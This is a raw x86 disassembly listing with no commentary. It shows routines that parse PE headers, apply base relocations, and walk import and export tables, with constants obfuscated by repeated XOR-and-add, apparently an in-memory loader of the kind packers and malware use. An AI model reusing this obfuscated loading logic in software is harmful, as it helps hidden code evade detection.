  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
